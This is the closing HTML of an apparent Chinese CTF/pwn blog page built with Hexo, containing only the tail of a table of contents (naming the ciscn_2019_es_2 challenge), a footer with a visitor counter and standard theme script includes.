href="#ciscn-2019-es-2"><span class="nav-number">1.7.</span> <span class="nav-text">ciscn_2019_es_2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#师傅们，今天-你pwn-了嘛！一起来学二进制吧。"><span class="nav-number">2.</span> <span class="nav-text">师傅们，今天 你pwn 了嘛！一起来学二进制吧。</span></a></li></ol></div>
            
          </div>
        </section>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">木头</span>
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
</span>

</div>


<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Muse
  </a>
</div>

        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  
  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>



  



  



  
  
  

  

  

</body>
</html>
